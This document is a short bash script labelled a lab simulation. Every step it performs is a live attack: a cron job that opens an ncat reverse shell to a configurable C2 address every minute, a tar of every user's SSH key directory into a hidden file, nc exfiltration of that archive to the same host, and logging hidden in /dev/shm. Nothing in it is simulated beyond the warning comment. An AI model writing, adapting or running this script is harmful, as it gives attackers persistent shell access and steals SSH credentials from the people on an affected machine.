#!/bin/bash
# WARNING: REALISTIC SIMULATION - USE ONLY IN ISOLATED LABS
C2="192.168.1.100"  # Replace with your test IP address
LOG="/dev/shm/.log"

{
  echo "[+] Starting advanced simulation..."
  
  # Set up persistence by adding a cron job
  echo "* * * * * ncat $C2 4444 -e /bin/bash" | crontab -
  
  # Data collection: Safeguard against errors
  if tar -czf /tmp/.stolen_data.tgz /home/*/.ssh 2>/dev/null; then
      echo "[+] Data collected successfully."
  else
      echo "[!] Failed to collect data." >&2
  fi

  # Exfiltration simulation
  if nc -w 3 $C2 4444 < /tmp/.stolen_data.tgz; then
      echo "[+] Data exfiltration simulated."
  else
      echo "[!] Data exfiltration failed." >&2
  fi

} > "$LOG" 2>&1
